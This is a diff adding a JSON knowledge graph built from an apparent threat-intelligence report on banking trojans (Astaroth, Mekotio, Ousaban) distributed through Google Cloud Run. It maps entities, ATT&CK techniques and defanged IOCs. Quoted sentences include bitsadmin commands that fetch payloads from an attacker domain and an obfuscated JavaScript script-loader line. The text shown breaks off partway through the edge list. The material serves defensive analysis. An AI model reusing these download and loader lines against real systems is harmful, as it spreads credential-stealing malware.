@@ -1,0 +1,1019 @@
+{
+  "nodes": {
+    "high_level": [
+      {
+        "node_id": "HL_0daf05cc4cb1",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Google Cloud Run",
+        "edges": [
+          "EDGE_1",
+          "EDGE_2",
+          "EDGE_3"
+        ],
+        "sentence_indices": [
+          0,
+          5,
+          12,
+          13,
+          18,
+          22,
+          23
+        ],
+        "span_sentences": [
+          "Google Cloud Run is currently being abused in high-volume malware distribution campaigns, spreading several banking trojans such as Astaroth (aka Guildma), Mekotio and Ousaban to targets across Latin America and Europe.",
+          "Since September 2023, we have observed a significant increase in the volume of malicious emails leveraging the Google Cloud Run service to infect potential victims with banking trojans.",
+          "Based on these characteristics, adversaries may view Google Cloud Run as an inexpensive, yet effective way to deploy distribution infrastructure on platforms that most organizations likely do not prevent internal systems from accessing.",
+          "It also enables the rapid rotation of new Google Cloud Run web applications as they are removed by the platform provider after users report them for abuse.",
+          "The emails contain hyperlinks to Google Cloud Run, which can be identified due to the use of run[.]app\nas the top-level domain (TLD).",
+          "In many cases, the MSI file is being delivered directly from the Google Cloud Run web service deployed by the adversary as shown in the case of Mekotio below.",
+          "In others, the Google Cloud Run web service responds with a 302 redirect to a file location within Google Cloud (hxxps[:]//storage[.]googleapis[.]com."
+        ]
+      },
+      {
+        "node_id": "HL_13f5bec9c532",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "Mekotio",
+        "edges": [
+          "EDGE_4",
+          "EDGE_5",
+          "EDGE_6",
+          "EDGE_7"
+        ],
+        "sentence_indices": [
+          0,
+          3,
+          6,
+          20,
+          22,
+          26,
+          51,
+          52
+        ],
+        "span_sentences": [
+          "Google Cloud Run is currently being abused in high-volume malware distribution campaigns, spreading several banking trojans such as Astaroth (aka Guildma), Mekotio and Ousaban to targets across Latin America and Europe.",
+          "- We have observed evidence that the distribution campaigns for these malware families are related, with Astaroth and Mekotio being distributed under the same Google Cloud Project and Google Cloud storage bucket.",
+          "Some of the highest volume campaigns recently observed were being used to deliver the Astaroth, Mekotio, and Ousaban banking trojans to victims largely located in Latin American countries.",
+          "As previously stated, we have observed Astaroth and Mekotio being distributed in this manner in the form of malicious Microsoft Installers (MSI) files as the Stage 1 payload to begin the infection process.",
+          "In many cases, the MSI file is being delivered directly from the Google Cloud Run web service deployed by the adversary as shown in the case of Mekotio below.",
+          "During our analysis, we observed cases where the same Google Cloud Storage Bucket was being used to deliver Mekotio and Astaroth payloads at the same time.",
+          "Mekotio is another banking trojan that has historically targeted Latin American victims, exfiltrating sensitive financial information from infected systems.",
+          "In the case of Mekotio, unlike Astaroth, which embeds JavaScript into the MSI, the MSIs contain malicious DLL files that are included as binary streams within the installer file itself."
+        ]
+      },
+      {
+        "node_id": "HL_18a8c40152fc",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Brazil",
+        "edges": [],
+        "sentence_indices": [
+          17
+        ],
+        "span_sentences": [
+          "We observed the majority of the systems sending these messages were located in Brazil."
+        ]
+      },
+      {
+        "node_id": "HL_2b1fb50a5d68",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "North America",
+        "edges": [],
+        "sentence_indices": [
+          7
+        ],
+        "span_sentences": [
+          "We have also observed lower volume campaign victims located throughout Europe and North America, which may indicate less geographically focused targeting by threat actors moving forward."
+        ]
+      },
+      {
+        "node_id": "HL_2e9e1d15ef40",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Europe",
+        "edges": [],
+        "sentence_indices": [
+          0,
+          7
+        ],
+        "span_sentences": [
+          "Google Cloud Run is currently being abused in high-volume malware distribution campaigns, spreading several banking trojans such as Astaroth (aka Guildma), Mekotio and Ousaban to targets across Latin America and Europe.",
+          "We have also observed lower volume campaign victims located throughout Europe and North America, which may indicate less geographically focused targeting by threat actors moving forward."
+        ]
+      },
+      {
+        "node_id": "HL_45f56da0b83e",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "Ousaban",
+        "edges": [
+          "EDGE_8",
+          "EDGE_9",
+          "EDGE_10"
+        ],
+        "sentence_indices": [
+          0,
+          4,
+          6,
+          10,
+          27,
+          38
+        ],
+        "span_sentences": [
+          "Google Cloud Run is currently being abused in high-volume malware distribution campaigns, spreading several banking trojans such as Astaroth (aka Guildma), Mekotio and Ousaban to targets across Latin America and Europe.",
+          "Ousaban is also being dropped as part of the Astaroth infection process.",
+          "Some of the highest volume campaigns recently observed were being used to deliver the Astaroth, Mekotio, and Ousaban banking trojans to victims largely located in Latin American countries.",
+          "In the case of Ousaban, the payload was being delivered as part of the same Astaroth infection previously mentioned.",
+          "We also observed Ousaban being delivered as part of a later stage of the same Astaroth infection chain.",
+          "\"C:\\Windows\\System32\\bitsadmin.exe\" /transfer 18109952453 /priority foreground hxxp[:]//wae4w[.]mariomanagement[.]biz[.]id/?50838302893639041 \"C:\\TempData28029613623\\Oculus.Toshiba.01997.5591.272dbl.log\"\nThis blob contains an additional PE file that was encoded with XOR (Key: 0x2A) and is the payload associated with the Ousaban banking trojan."
+        ]
+      },
+      {
+        "node_id": "HL_468625070e08",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Cisco Talos",
+        "edges": [],
+        "sentence_indices": [
+          14
+        ],
+        "span_sentences": [
+          "Cisco Talos contacted Google to ensure that they were made aware of the activity recently observed across the threat landscape."
+        ]
+      },
+      {
+        "node_id": "HL_56d0c3f089f4",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "Guildma",
+        "edges": [],
+        "sentence_indices": [
+          0
+        ],
+        "span_sentences": [
+          "Google Cloud Run is currently being abused in high-volume malware distribution campaigns, spreading several banking trojans such as Astaroth (aka Guildma), Mekotio and Ousaban to targets across Latin America and Europe."
+        ]
+      },
+      {
+        "node_id": "HL_5a41715fe692",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Google",
+        "edges": [],
+        "sentence_indices": [
+          0,
+          3,
+          5,
+          9,
+          12,
+          13,
+          14,
+          18,
+          22,
+          23,
+          26,
+          28,
+          33
+        ],
+        "span_sentences": [
+          "Google Cloud Run is currently being abused in high-volume malware distribution campaigns, spreading several banking trojans such as Astaroth (aka Guildma), Mekotio and Ousaban to targets across Latin America and Europe.",
+          "- We have observed evidence that the distribution campaigns for these malware families are related, with Astaroth and Mekotio being distributed under the same Google Cloud Project and Google Cloud storage bucket.",
+          "Since September 2023, we have observed a significant increase in the volume of malicious emails leveraging the Google Cloud Run service to infect potential victims with banking trojans.",
+          "Additionally, we have observed all three malware families being delivered during the same timeframe from the same storage bucket within Google Cloud.",
+          "Based on these characteristics, adversaries may view Google Cloud Run as an inexpensive, yet effective way to deploy distribution infrastructure on platforms that most organizations likely do not prevent internal systems from accessing.",
+          "It also enables the rapid rotation of new Google Cloud Run web applications as they are removed by the platform provider after users report them for abuse.",
+          "Cisco Talos contacted Google to ensure that they were made aware of the activity recently observed across the threat landscape.",
+          "The emails contain hyperlinks to Google Cloud Run, which can be identified due to the use of run[.]app\nas the top-level domain (TLD).",
+          "In many cases, the MSI file is being delivered directly from the Google Cloud Run web service deployed by the adversary as shown in the case of Mekotio below.",
+          "In others, the Google Cloud Run web service responds with a 302 redirect to a file location within Google Cloud (hxxps[:]//storage[.]googleapis[.]com.",
+          "During our analysis, we observed cases where the same Google Cloud Storage Bucket was being used to deliver Mekotio and Astaroth payloads at the same time.",
+          "As this means that the same Google Cloud Project was being used to distribute both malware families, and based on the overlaps in distribution TTPs, we assess with moderate confidence that the distribution campaigns are linked to the same threat actor.",
+          "This IP address was also located within the Google Cloud environment during analysis."
+        ]
+      },
+      {
+        "node_id": "HL_7ae3e4278757",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Google Cloud",
+        "edges": [
+          "EDGE_11"
+        ],
+        "sentence_indices": [
+          3,
+          9,
+          23,
+          26,
+          28,
+          33
+        ],
+        "span_sentences": [
+          "- We have observed evidence that the distribution campaigns for these malware families are related, with Astaroth and Mekotio being distributed under the same Google Cloud Project and Google Cloud storage bucket.",
+          "Additionally, we have observed all three malware families being delivered during the same timeframe from the same storage bucket within Google Cloud.",
+          "In others, the Google Cloud Run web service responds with a 302 redirect to a file location within Google Cloud (hxxps[:]//storage[.]googleapis[.]com.",
+          "During our analysis, we observed cases where the same Google Cloud Storage Bucket was being used to deliver Mekotio and Astaroth payloads at the same time.",
+          "As this means that the same Google Cloud Project was being used to distribute both malware families, and based on the overlaps in distribution TTPs, we assess with moderate confidence that the distribution campaigns are linked to the same threat actor.",
+          "This IP address was also located within the Google Cloud environment during analysis."
+        ]
+      },
+      {
+        "node_id": "HL_7ed57c50b71a",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "LATAM",
+        "edges": [],
+        "sentence_indices": [
+          15
+        ],
+        "span_sentences": [
+          "The language distribution of the emails observed across these campaigns also demonstrates a strong focus on LATAM with the overwhelming majority of emails being sent in Spanish."
+        ]
+      },
+      {
+        "node_id": "HL_9eda4005a3a9",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "VMProtect",
+        "edges": [
+          "EDGE_12"
+        ],
+        "sentence_indices": [
+          55
+        ],
+        "span_sentences": [
+          "The final payload is written in Delphi and packed using VMProtect to make analysis more difficult."
+        ]
+      },
+      {
+        "node_id": "HL_aff4f951ca1c",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "Ngrok",
+        "edges": [
+          "EDGE_13",
+          "EDGE_14"
+        ],
+        "sentence_indices": [
+          50
+        ],
+        "span_sentences": [
+          "The payload communicates with C2 using Ngrok (1[.]tcp[.]sa[.]ngrok[.]io\n) over TCP/26885."
+        ]
+      },
+      {
+        "node_id": "HL_d16313ae446a",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "Astaroth",
+        "edges": [
+          "EDGE_15",
+          "EDGE_16",
+          "EDGE_17",
+          "EDGE_18",
+          "EDGE_19",
+          "EDGE_20",
+          "EDGE_21",
+          "EDGE_22",
+          "EDGE_23"
+        ],
+        "sentence_indices": [
+          0,
+          3,
+          4,
+          6,
+          8,
+          10,
+          20,
+          26,
+          27,
+          41,
+          44
+        ],
+        "span_sentences": [
+          "Google Cloud Run is currently being abused in high-volume malware distribution campaigns, spreading several banking trojans such as Astaroth (aka Guildma), Mekotio and Ousaban to targets across Latin America and Europe.",
+          "- We have observed evidence that the distribution campaigns for these malware families are related, with Astaroth and Mekotio being distributed under the same Google Cloud Project and Google Cloud storage bucket.",
+          "Ousaban is also being dropped as part of the Astaroth infection process.",
+          "Some of the highest volume campaigns recently observed were being used to deliver the Astaroth, Mekotio, and Ousaban banking trojans to victims largely located in Latin American countries.",
+          "The current variant of Astaroth targets more than 300 institutions across 15 Latin American countries.",
+          "In the case of Ousaban, the payload was being delivered as part of the same Astaroth infection previously mentioned.",
+          "As previously stated, we have observed Astaroth and Mekotio being distributed in this manner in the form of malicious Microsoft Installers (MSI) files as the Stage 1 payload to begin the infection process.",
+          "During our analysis, we observed cases where the same Google Cloud Storage Bucket was being used to deliver Mekotio and Astaroth payloads at the same time.",
+          "We also observed Ousaban being delivered as part of a later stage of the same Astaroth infection chain.",
+          "The script contains an embedded hexadecimal blob that represents a DLL that functions as a loader for the final Astaroth payload.",
+          "Astaroth also implements code to monitor the foreground window for the presence of popular browsers."
+        ]
+      },
+      {
+        "node_id": "HL_e614e7a7bc8c",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Latin America",
+        "edges": [],
+        "sentence_indices": [
+          0
+        ],
+        "span_sentences": [
+          "Google Cloud Run is currently being abused in high-volume malware distribution campaigns, spreading several banking trojans such as Astaroth (aka Guildma), Mekotio and Ousaban to targets across Latin America and Europe."
+        ]
+      }
+    ],
+    "ttp": [
+      {
+        "node_id": "TTP_T1027",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1027",
+        "edges": [
+          "EDGE_8",
+          "EDGE_12",
+          "EDGE_15",
+          "EDGE_31"
+        ],
+        "best_span_ranges": [
+          [
+            37,
+            38
+          ],
+          [
+            39,
+            40
+          ],
+          [
+            55,
+            55
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "We also observed Bitsadmin being used to retrieve a file containing a data blob.",
+            "\"C:\\Windows\\System32\\bitsadmin.exe\" /transfer 18109952453 /priority foreground hxxp[:]//wae4w[.]mariomanagement[.]biz[.]id/?50838302893639041 \"C:\\TempData28029613623\\Oculus.Toshiba.01997.5591.272dbl.log\"\nThis blob contains an additional PE file that was encoded with XOR (Key: 0x2A) and is the payload associated with the Ousaban banking trojan."
+          ],
+          [
+            "The compiled AutoIt script is a DLL loader modified from a tutorial shared on the AutoIT community forum.",
+            "The attacker obfuscated the name of some arguments like the function name in the script."
+          ],
+          [
+            "The final payload is written in Delphi and packed using VMProtect to make analysis more difficult."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1056",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1056",
+        "edges": [
+          "EDGE_16"
+        ],
+        "best_span_ranges": [
+          [
+            44,
+            46
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Astaroth also implements code to monitor the foreground window for the presence of popular browsers.",
+            "Once one is identified, it will check the window title to see if one of the banks in its monitoring list is open.",
+            "If a target bank is open, the malware is capable of logging keystrokes and taking screenshots of the screen around the mouse pointer when the user clicks on the screen."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1071",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1071",
+        "edges": [
+          "EDGE_4",
+          "EDGE_13",
+          "EDGE_17",
+          "EDGE_26"
+        ],
+        "best_span_ranges": [
+          [
+            50,
+            50
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "The payload communicates with C2 using Ngrok (1[.]tcp[.]sa[.]ngrok[.]io\n) over TCP/26885."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1090",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1090",
+        "edges": [
+          "EDGE_14",
+          "EDGE_18",
+          "EDGE_27"
+        ],
+        "best_span_ranges": [
+          [
+            50,
+            50
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "The payload communicates with C2 using Ngrok (1[.]tcp[.]sa[.]ngrok[.]io\n) over TCP/26885."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1102",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1102",
+        "edges": [
+          "EDGE_1",
+          "EDGE_5",
+          "EDGE_19",
+          "EDGE_29",
+          "EDGE_33"
+        ],
+        "best_span_ranges": [
+          [
+            3,
+            3
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "- We have observed evidence that the distribution campaigns for these malware families are related, with Astaroth and Mekotio being distributed under the same Google Cloud Project and Google Cloud storage bucket."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1105",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1105",
+        "edges": [
+          "EDGE_2",
+          "EDGE_6",
+          "EDGE_9",
+          "EDGE_11",
+          "EDGE_20",
+          "EDGE_25",
+          "EDGE_28",
+          "EDGE_32",
+          "EDGE_34",
+          "EDGE_35",
+          "EDGE_36"
+        ],
+        "best_span_ranges": [
+          [
+            2,
+            2
+          ],
+          [
+            19,
+            19
+          ],
+          [
+            22,
+            23
+          ],
+          [
+            34,
+            37
+          ],
+          [
+            37,
+            38
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "- The infection chains associated with these malware families feature the use of malicious Microsoft Installers (MSIs) that function as droppers or downloaders for the final malware payload(s)."
+          ],
+          [
+            "When victims access these hyperlinks, they are redirected to the Cloud Run web services deployed by the threat actors and delivered the components necessary to initiate the infection process."
+          ],
+          [
+            "In many cases, the MSI file is being delivered directly from the Google Cloud Run web service deployed by the adversary as shown in the case of Mekotio below.",
+            "In others, the Google Cloud Run web service responds with a 302 redirect to a file location within Google Cloud (hxxps[:]//storage[.]googleapis[.]com."
+          ],
+          [
+            "The malware then uses the Bitsadmin living-off-the-land binary (LoLBin) to retrieve the next-stage components from the aforementioned distribution server.",
+            "First, it retrieves the legitimate executable associated with AutoIt3.exe which will be used to execute a compiled AutoIt script later in the infection process.",
+            "\"C:\\Windows\\System32\\bitsadmin.exe\" /transfer 18109952453 /priority foreground hxxp[:]//wae4w[.]mariomanagement[.]biz[.]id/?74709605275628771 \"C:\\TempData28029613623\\Oculus.Toshiba.01997.5591.272.exe\"\nAdditional components, such as the sqlite3.dll and the compiled AutoIt3 script, are also retrieved using Bitsadmin.",
+            "We also observed Bitsadmin being used to retrieve a file containing a data blob."
+          ],
+          [
+            "We also observed Bitsadmin being used to retrieve a file containing a data blob.",
+            "\"C:\\Windows\\System32\\bitsadmin.exe\" /transfer 18109952453 /priority foreground hxxp[:]//wae4w[.]mariomanagement[.]biz[.]id/?50838302893639041 \"C:\\TempData28029613623\\Oculus.Toshiba.01997.5591.272dbl.log\"\nThis blob contains an additional PE file that was encoded with XOR (Key: 0x2A) and is the payload associated with the Ousaban banking trojan."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1113",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1113",
+        "edges": [
+          "EDGE_21"
+        ],
+        "best_span_ranges": [
+          [
+            44,
+            46
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Astaroth also implements code to monitor the foreground window for the presence of popular browsers.",
+            "Once one is identified, it will check the window title to see if one of the banks in its monitoring list is open.",
+            "If a target bank is open, the malware is capable of logging keystrokes and taking screenshots of the screen around the mouse pointer when the user clicks on the screen."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1218",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1218",
+        "edges": [
+          "EDGE_22",
+          "EDGE_24"
+        ],
+        "best_span_ranges": [
+          [
+            34,
+            37
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "The malware then uses the Bitsadmin living-off-the-land binary (LoLBin) to retrieve the next-stage components from the aforementioned distribution server.",
+            "First, it retrieves the legitimate executable associated with AutoIt3.exe which will be used to execute a compiled AutoIt script later in the infection process.",
+            "\"C:\\Windows\\System32\\bitsadmin.exe\" /transfer 18109952453 /priority foreground hxxp[:]//wae4w[.]mariomanagement[.]biz[.]id/?74709605275628771 \"C:\\TempData28029613623\\Oculus.Toshiba.01997.5591.272.exe\"\nAdditional components, such as the sqlite3.dll and the compiled AutoIt3 script, are also retrieved using Bitsadmin.",
+            "We also observed Bitsadmin being used to retrieve a file containing a data blob."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1566",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1566",
+        "edges": [
+          "EDGE_3",
+          "EDGE_7",
+          "EDGE_10",
+          "EDGE_23",
+          "EDGE_30"
+        ],
+        "best_span_ranges": [
+          [
+            18,
+            18
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "The emails contain hyperlinks to Google Cloud Run, which can be identified due to the use of run[.]app\nas the top-level domain (TLD)."
+          ]
+        ]
+      }
+    ],
+    "ioc": [
+      {
+        "node_id": "IOC_0d408af7a2e7",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "//w3iuwl[.]nextmax[.]my[.]id/?5/",
+        "edges": [],
+        "sentence_indices": [
+          31
+        ],
+        "span_sentences": [
+          "var C280=\"s\"+\"cr\";D280=\"ipt\"+\":h\";E280=\"Tt\"+\"P:\";GetObject(C280+D280+E280+\"//w3iuwl[.]nextmax[.]my[.]id/?5/\");."
+        ]
+      },
+      {
+        "node_id": "IOC_1ef349d06256",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "regsvcs.exe",
+        "edges": [
+          "EDGE_24"
+        ],
+        "sentence_indices": [
+          43
+        ],
+        "span_sentences": [
+          "The loader DLL reads the “sdk.log\n” file from the disk and decodes it, starts the process “regsvcs.exe."
+        ]
+      },
+      {
+        "node_id": "IOC_3dd569c8de07",
+        "node_class": "ioc",
+        "node_type": "IPAddress",
+        "node_text": "34[.]135[.]1[.]100",
+        "edges": [],
+        "sentence_indices": [
+          32
+        ],
+        "span_sentences": [
+          "At the time of analysis, all of the distribution URLs were being hosted on the same system (34[.]135[.]1[.]100\n)."
+        ]
+      },
+      {
+        "node_id": "IOC_4a2d1271d879",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "ssleay32.dll",
+        "edges": [],
+        "sentence_indices": [
+          54
+        ],
+        "span_sentences": [
+          "The CAB file contents include:\n- libeay32.dll\n- ssleay32.dll\n- l.txt (written to\n%PROGRAMDATA%\nas8.txt\n)\nThe DLL is then executed by calling the appropriate exported function."
+        ]
+      },
+      {
+        "node_id": "IOC_5815950987f7",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "l.txt",
+        "edges": [],
+        "sentence_indices": [
+          54
+        ],
+        "span_sentences": [
+          "The CAB file contents include:\n- libeay32.dll\n- ssleay32.dll\n- l.txt (written to\n%PROGRAMDATA%\nas8.txt\n)\nThe DLL is then executed by calling the appropriate exported function."
+        ]
+      },
+      {
+        "node_id": "IOC_667fdc8a7b35",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "hxxp[:]//wae4w[.]mariomanagement[.]biz[.]id/?50838302893639041",
+        "edges": [
+          "EDGE_25"
+        ],
+        "sentence_indices": [
+          38
+        ],
+        "span_sentences": [
+          "\"C:\\Windows\\System32\\bitsadmin.exe\" /transfer 18109952453 /priority foreground hxxp[:]//wae4w[.]mariomanagement[.]biz[.]id/?50838302893639041 \"C:\\TempData28029613623\\Oculus.Toshiba.01997.5591.272dbl.log\"\nThis blob contains an additional PE file that was encoded with XOR (Key: 0x2A) and is the payload associated with the Ousaban banking trojan."
+        ]
+      },
+      {
+        "node_id": "IOC_7dc6ebfd3457",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "%PROGRAMDATA%",
+        "edges": [],
+        "sentence_indices": [
+          53,
+          54
+        ],
+        "span_sentences": [
+          "When the MSI is executed, the contents of the CAB file are extracted to %PROGRAMDATA%\n.",
+          "The CAB file contents include:\n- libeay32.dll\n- ssleay32.dll\n- l.txt (written to\n%PROGRAMDATA%\nas8.txt\n)\nThe DLL is then executed by calling the appropriate exported function."
+        ]
+      },
+      {
+        "node_id": "IOC_909196b9a81b",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "as8.txt",
+        "edges": [],
+        "sentence_indices": [
+          54
+        ],
+        "span_sentences": [
+          "The CAB file contents include:\n- libeay32.dll\n- ssleay32.dll\n- l.txt (written to\n%PROGRAMDATA%\nas8.txt\n)\nThe DLL is then executed by calling the appropriate exported function."
+        ]
+      },
+      {
+        "node_id": "IOC_913398352d62",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "1[.]tcp[.]sa[.]ngrok[.]io",
+        "edges": [
+          "EDGE_26",
+          "EDGE_27"
+        ],
+        "sentence_indices": [
+          50
+        ],
+        "span_sentences": [
+          "The payload communicates with C2 using Ngrok (1[.]tcp[.]sa[.]ngrok[.]io\n) over TCP/26885."
+        ]
+      },
+      {
+        "node_id": "IOC_92939dd2b787",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "libeay32.dll",
+        "edges": [],
+        "sentence_indices": [
+          54
+        ],
+        "span_sentences": [
+          "The CAB file contents include:\n- libeay32.dll\n- ssleay32.dll\n- l.txt (written to\n%PROGRAMDATA%\nas8.txt\n)\nThe DLL is then executed by calling the appropriate exported function."
+        ]
+      },
+      {
+        "node_id": "IOC_af4568c88da3",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\Windows\\System32\\bitsadmin.exe",
+        "edges": [
+          "EDGE_28"
+        ],
+        "sentence_indices": [
+          36,
+          38
+        ],
+        "span_sentences": [
+          "\"C:\\Windows\\System32\\bitsadmin.exe\" /transfer 18109952453 /priority foreground hxxp[:]//wae4w[.]mariomanagement[.]biz[.]id/?74709605275628771 \"C:\\TempData28029613623\\Oculus.Toshiba.01997.5591.272.exe\"\nAdditional components, such as the sqlite3.dll and the compiled AutoIt3 script, are also retrieved using Bitsadmin.",
+          "\"C:\\Windows\\System32\\bitsadmin.exe\" /transfer 18109952453 /priority foreground hxxp[:]//wae4w[.]mariomanagement[.]biz[.]id/?50838302893639041 \"C:\\TempData28029613623\\Oculus.Toshiba.01997.5591.272dbl.log\"\nThis blob contains an additional PE file that was encoded with XOR (Key: 0x2A) and is the payload associated with the Ousaban banking trojan."
+        ]
+      },
+      {
+        "node_id": "IOC_b79637e0692d",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "sdk.log",
+        "edges": [],
+        "sentence_indices": [
+          42
+        ],
+        "span_sentences": [
+          "The payload itself is saved to the same folder above using the name “sdk.log."
+        ]
+      },
+      {
+        "node_id": "IOC_b8e637be7289",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "run[.]app",
+        "edges": [
+          "EDGE_29",
+          "EDGE_30"
+        ],
+        "sentence_indices": [
+          18
+        ],
+        "span_sentences": [
+          "The emails contain hyperlinks to Google Cloud Run, which can be identified due to the use of run[.]app\nas the top-level domain (TLD)."
+        ]
+      },
+      {
+        "node_id": "IOC_bbbb37bcc41f",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\TempData28029613623\\Oculus.Toshiba.01997.5591.272dbl.log",
+        "edges": [
+          "EDGE_31",
+          "EDGE_32"
+        ],
+        "sentence_indices": [
+          38
+        ],
+        "span_sentences": [
+          "\"C:\\Windows\\System32\\bitsadmin.exe\" /transfer 18109952453 /priority foreground hxxp[:]//wae4w[.]mariomanagement[.]biz[.]id/?50838302893639041 \"C:\\TempData28029613623\\Oculus.Toshiba.01997.5591.272dbl.log\"\nThis blob contains an additional PE file that was encoded with XOR (Key: 0x2A) and is the payload associated with the Ousaban banking trojan."
+        ]
+      },
+      {
+        "node_id": "IOC_c56ed8af1f7b",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "hxxps[:]//storage[.]googleapis[.]com",
+        "edges": [
+          "EDGE_33",
+          "EDGE_34"
+        ],
+        "sentence_indices": [
+          23
+        ],
+        "span_sentences": [
+          "In others, the Google Cloud Run web service responds with a 302 redirect to a file location within Google Cloud (hxxps[:]//storage[.]googleapis[.]com."
+        ]
+      },
+      {
+        "node_id": "IOC_ce84cadd9a72",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "hxxp[:]//wae4w[.]mariomanagement[.]biz[.]id/?74709605275628771",
+        "edges": [
+          "EDGE_35"
+        ],
+        "sentence_indices": [
+          36
+        ],
+        "span_sentences": [
+          "\"C:\\Windows\\System32\\bitsadmin.exe\" /transfer 18109952453 /priority foreground hxxp[:]//wae4w[.]mariomanagement[.]biz[.]id/?74709605275628771 \"C:\\TempData28029613623\\Oculus.Toshiba.01997.5591.272.exe\"\nAdditional components, such as the sqlite3.dll and the compiled AutoIt3 script, are also retrieved using Bitsadmin."
+        ]
+      },
+      {
+        "node_id": "IOC_d62e01cb31a7",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\TempData28029613623\\Oculus.Toshiba.01997.5591.272.exe",
+        "edges": [
+          "EDGE_36"
+        ],
+        "sentence_indices": [
+          36
+        ],
+        "span_sentences": [
+          "\"C:\\Windows\\System32\\bitsadmin.exe\" /transfer 18109952453 /priority foreground hxxp[:]//wae4w[.]mariomanagement[.]biz[.]id/?74709605275628771 \"C:\\TempData28029613623\\Oculus.Toshiba.01997.5591.272.exe\"\nAdditional components, such as the sqlite3.dll and the compiled AutoIt3 script, are also retrieved using Bitsadmin."
+        ]
+      }
+    ]
+  },
+  "edges": [
+    {
+      "edge_id": "EDGE_1",
+      "node_u": "HL_0daf05cc4cb1",
+      "node_v": "TTP_T1102"
+    },
+    {
+      "edge_id": "EDGE_2",
+      "node_u": "HL_0daf05cc4cb1",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_3",
+      "node_u": "HL_0daf05cc4cb1",
+      "node_v": "TTP_T1566"
+    },
+    {
+      "edge_id": "EDGE_4",
+      "node_u": "HL_13f5bec9c532",
+      "node_v": "TTP_T1071"
+    },
+    {
+      "edge_id": "EDGE_5",
+      "node_u": "HL_13f5bec9c532",
+      "node_v": "TTP_T1102"
+    },
+    {
+      "edge_id": "EDGE_6",
+      "node_u": "HL_13f5bec9c532",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_7",
+      "node_u": "HL_13f5bec9c532",
+      "node_v": "TTP_T1566"
+    },
+    {
+      "edge_id": "EDGE_8",
+      "node_u": "HL_45f56da0b83e",
+      "node_v": "TTP_T1027"
+    },
+    {
+      "edge_id": "EDGE_9",
+      "node_u": "HL_45f56da0b83e",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_10",
+      "node_u": "HL_45f56da0b83e",
+      "node_v": "TTP_T1566"
+    },
+    {
+      "edge_id": "EDGE_11",
+      "node_u": "HL_7ae3e4278757",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_12",
+      "node_u": "HL_9eda4005a3a9",
+      "node_v": "TTP_T1027"
+    },
+    {
+      "edge_id": "EDGE_13",
+      "node_u": "HL_aff4f951ca1c",
+      "node_v": "TTP_T1071"
+    },
+    {
+      "edge_id": "EDGE_14",
+      "node_u": "HL_aff4f951ca1c",
+      "node_v": "TTP_T1090"
+    },
+    {
+      "edge_id": "EDGE_15",
+      "node_u": "HL_d16313ae446a",
+      "node_v": "TTP_T1027"
+    },
+    {
